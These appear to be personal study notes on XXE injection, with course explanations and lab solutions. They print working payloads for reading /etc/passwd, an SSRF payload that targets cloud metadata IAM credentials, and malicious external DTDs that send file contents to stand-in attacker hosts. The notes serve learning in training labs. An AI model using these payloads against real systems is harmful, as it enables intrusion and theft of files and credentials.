## Exploiting XXE to retrieve files
 To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

- Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.
- Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server: 
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>381</productId>
</stockCheck>
```
You can exploit the XXE vulnerability to retrieve the /etc/passwd file by submitting the following XXE payload: 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

> **Note:**  
> 
> With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response. To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response. 

## Perform SSRF: (lab)
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
```  

# Blind XXE
## Detecting blind XXE using out-of-band (OAST) techniques
Let's say there's a POST request which sends the following xml:
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>3</storeId>
</stockCheck>
```
Insert external entity and replace the productId number with a reference to the external entity: 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://your-domain.com"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>3</storeId>
</stockCheck>
```
Then go to your server and look at request logs

## Blind XXE with out-of-band interaction via XML parameter entities
Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name: 
```
<!ENTITY % myparameterentity "my parameter entity value" >
```
And second, parameter entities are referenced using the percent character instead of the usual ampersand: 
```
%myparameterentity;
```
This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows: 
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```
This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.

Lab solution:
There's a request:
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>1</productId><storeId>1</storeId>
</stockCheck>
```
Change to:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://your-server.com"> %xxe; ]>
<stockCheck>
<productId>1</productId><storeId>1</storeId>
</stockCheck>
```
And check logs on your server. Most likely we'll need to check logs on our DNS server first

## Exploiting blind XXE to exfiltrate data out-of-band
What an attacker really wants to achieve is to exfiltrate sensitive data. This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.

An example of a malicious DTD to exfiltrate the contents of the /etc/passwd file is as follows: 
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
This DTD carries out the following steps:
- Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.
- Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called exfiltrate. The exfiltrate entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the file entity within the URL query string.
- Uses the eval entity, which causes the dynamic declaration of the exfiltrate entity to be performed.
- Uses the exfiltrate entity, so that its value is evaluated by requesting the specified URL.

The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL:
`http://web-attacker.com/malicious.dtd`

Finally, the attacker must submit the following XXE payload to the vulnerable application:
``` 
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
``` 

This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline. The steps defined within the malicious DTD are then executed, and the /etc/passwd file is transmitted to the attacker's server. 

> Note
> 
> This technique might not work with some file contents, including the newline characters contained in the `/etc/passwd` file. This is because some XML parsers fetch the URL in the external entity definition using an API that validates the characters that are allowed to appear within the URL. In this situation, it might be possible to use the FTP protocol instead of HTTP. Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as `/etc/hostname` can be targeted instead.

## Lab (Burp Collab only): Exploiting blind XXE to exfiltrate data using a malicious external DTD
There's an endpoint:
```
POST /product/stock
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```
Create maicious DTD file and save it on your server:
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil
```

Stopped solving the lab because didn't have burp collaborator and it also felt that xml vulnerabilities are not interesting...

## Exploiting blind XXE to retrieve data via error messages
You can trigger an XML parsing error message containing the contents of the /etc/passwd file using a malicious external DTD as follows:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
This DTD carries out the following steps:
- Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.
- Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called error. The error entity will be evaluated by loading a nonexistent file whose name contains the value of the file entity.
- Uses the eval entity, which causes the dynamic declaration of the error entity to be performed.
- Uses the error entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the /etc/passwd file.

